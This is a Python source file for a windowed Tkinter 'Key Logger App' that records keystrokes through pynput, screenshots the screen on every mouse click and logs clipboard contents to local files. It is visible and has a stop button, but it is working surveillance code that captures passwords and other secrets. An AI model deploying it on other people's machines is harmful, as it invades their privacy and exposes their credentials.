import tkinter as tk
from pynput import keyboard, mouse
import pyautogui
import os
import time
import win32clipboard
import threading

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Key Logger App")
        self.root.geometry("800x600")  # You can adjust the size as needed

        self.stop_button = tk.Button(root, text="Stop Recording", command=self.stop_recording, state=tk.NORMAL)
        self.stop_button.pack(pady=10)

        self.restart_button = tk.Button(root, text="Restart Recording", command=self.restart_recording, state=tk.DISABLED)
        self.restart_button.pack(pady=10)

        self.pressed_keys = []
        self.clipboard_logs = []
        self.screenshot_count = 1
        self.recording_counter = 1
        self.output_path = "D:/code_dao/py/output/"
        self.screenshot_path = os.path.join(self.output_path, "screenshots/")
        self.keys_file_path = os.path.join(self.output_path, f"recorded_keys_{self.recording_counter}.txt")

        os.makedirs(self.screenshot_path, exist_ok=True)

        self.keyboard_listener = None
        self.mouse_listener = None

        # Start recording automatically
        self.start_recording()

    def clean_path(self, path):
        valid_chars = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\")
        return ''.join(char for char in path if char in valid_chars)

    def on_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = f"Special key {key}"

        self.pressed_keys.append(key_str)
        print(f"Pressed key: {key_str}")

    def on_click(self, x, y, button, pressed):
        if pressed:
            clean_path_screenshot_path = self.clean_path(self.screenshot_path)
            os.makedirs(clean_path_screenshot_path, exist_ok=True)
            screenshot_name = f"screenshot_{self.screenshot_count}_{self.recording_counter}.png"
            self.screenshot_count += 1
            self.root.after(1, lambda: self.capture_screenshot(screenshot_name))

    def capture_screenshot(self, screenshot_name):
        screenshot = pyautogui.screenshot()
        screenshot.save(os.path.join(self.screenshot_path, screenshot_name))
        print(f"Screenshot captured: {screenshot_name}")

    def start_listening(self):
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press)
        self.mouse_listener = mouse.Listener(on_click=self.on_click)
        self.keyboard_listener.start()
        self.mouse_listener.start()

    def stop_listening(self):
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()

    def start_recording(self):
        self.stop_button.config(state=tk.NORMAL)
        self.restart_button.config(state=tk.DISABLED)
        self.pressed_keys = []
        self.clipboard_logs = []
        self.screenshot_count = 1
        self.recording_counter += 1
        self.keys_file_path = os.path.join(self.output_path, f"recorded_keys_{self.recording_counter}.txt")
        self.start_listening()

        # Start clipboard monitoring in a separate thread
        threading.Thread(target=self.monitor_clipboard).start()

    def stop_recording(self):
        self.stop_button.config(state=tk.DISABLED)
        self.restart_button.config(state=tk.NORMAL)
        self.stop_listening()

        # Specify the encoding as 'utf-8' when opening the file
        with open(self.keys_file_path, "w", encoding="utf-8") as keys_file:
            keys_file.write("Recorded keys:\n")
            keys_file.write("\n".join(self.pressed_keys))
            keys_file.write("\n\nClipboard logs:\n")
            keys_file.write("\n".join(self.clipboard_logs))
            print(f"Recorded data saved to: {self.keys_file_path}")

    def restart_recording(self):
        self.stop_button.config(state=tk.NORMAL)
        self.restart_button.config(state=tk.DISABLED)
        self.start_recording()

    def monitor_clipboard(self):
        while True:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if clipboard_data and clipboard_data not in self.clipboard_logs:
                self.clipboard_logs.append(clipboard_data)
                print(f"Clipboard log: {clipboard_data}")
            time.sleep(1)

if __name__ == "__main__":
    import threading

    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
